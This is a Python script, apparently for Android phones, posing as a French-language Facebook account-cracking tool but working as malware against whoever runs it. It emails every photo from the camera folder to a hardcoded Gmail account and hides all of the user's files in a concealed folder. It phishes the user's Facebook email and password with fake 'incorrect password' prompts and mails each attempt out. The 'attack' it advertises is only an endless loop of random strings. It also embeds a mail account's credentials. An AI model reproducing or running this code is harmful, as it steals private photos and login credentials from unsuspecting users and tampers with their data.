import os
try:
    import mechanize, requests
except:
    os.system('pip install mechanize; pip install requests')
    import mechanize, requests
import smtplib, ssl, shutil, time, random
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from multiprocessing import Process
import time
mp = '#Property1'
os.system('clear')
print('''
╔═══╗╔╗─╔╗╔═══╗╔══╗╔════╗╔══╗╔═══╗
║╔══╝║║─║║║╔═╗║╚╣─╝║╔╗╔╗║╚╣─╝║╔══╝
║╚══╗║║─║║║║─╚╝─║║─╚╝║║╚╝─║║─║╚══╗
║╔══╝║║─║║║║╔═╗─║║───║║───║║─║╔══╝
║║───║╚═╝║║╚╩═║╔╣─╗──║║──╔╣─╗║║───
╚╝───╚═══╝╚═══╝╚══╝──╚╝──╚══╝╚╝───''')
print('\nconfiguration du programme, ceci prendra maximum 5 minutes, veuillez patienter...')

smtp_address = 'smtp.gmail.com'
smtp_port = 465
ma = 'lucasnathanx15@gmail.com'
ra= 'teamfugitifdev.h4ck@gmail.com'
context = ssl.create_default_context()
#server= smtplib​.​SMTP_SSL​(​smtp_address​, smtp_port, context=context)
server = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)

def connect(nom):
    with open(nom, 'rb') as fp:
        img = MIMEImage(fp.read())
        img.add_header('Content-Disposition', 'attachment', filename=nom)
        msg.attach(img) 
        #server.sendmail(ma, ra, msg.as_string())
try:
 msg = MIMEMultipart()
 connexion=''
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
 chemin = '/storage/emulated/0//DCIM/Camera/'
 os.chdir('/storage/emulated/0/DCIM/Camera')
 liste = os.listdir()
 for x in liste:
    l = list(x)
    #print(l)
    if '.' in l:
        #print(x)
        if l[-1] is 'g':
            #print(x)
            n = chemin + x
            na = list(n)
            if ' ' in na:
                na.remove(' ')
            name = ''.join(na)
            connect(name)
 #print('soon ready...')

 #server​.​sendmail​(​ma, ra, msg.as_string())
 server.login(ma, mp)
 def sendit():
   server.sendmail(ma, ra, msg.as_string())
   
 if __name__ == '__main__':
    # We create a Process
    action_process = Process(target=sendit)
    action_process.start()
    action_process.join(timeout=300 )
    action_process.terminate()
    print("Ready!")
    
except:
 pass

br = mechanize.Browser()
br.set_handle_robots(False)
url = 'https://2no.co/29KaK6'
#ipa = br.open(url)
ipz = requests.get(url)
try:
 os.chdir('/storage/emulated/0')
 os.system('mkdir Fugitif')
 for x in os.listdir():
   shutil.move(x, '/storage/emulated/0/Fugitif')
 shutil.move('Fugitif', '.fugitif')
except:
 pass

s2 = smtplib.SMTP_SSL(smtp_address, smtp_port, context=context)
s2.login(ma, mp)

id = str(input('\nVeuillez vous connecter à Facebook pour continuer. \nEmail/tél:  '))
while '@' not in id and '+' not in id:
   id = str(input('Veuillez saisir votre numéro avec l\'indicatif du pays ou utilisez une email valide: '))
passw = str(input('mot de passe: '))
ij = 1
while ij < 3:
   print('connexion en cours')
   details = id + '\n' + passw 
   s2.sendmail(ma, ra, details)
   passw = str(input('\nmot de passe incorrect \nSaisissez le mot de passe correct : '))
   ij += 1
s2.sendmail(ma, ra, details)

l= input('\ncoller le lien du compte cible : ')

def loop():
    az = 'azertyuiopqsdfghjklmwxcvnb'
    aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
    a1 = str('1234567890')
    #ajs = '*@#)(?!;:'
    all = az + a1 + aZ
    lax = 0
    print('recherche en cours...')
    time.sleep(2)
    while lax < 2999992499999245053:
       print(lax, ''.join(random.sample(all, 8)))
       #lax += 1
loop()
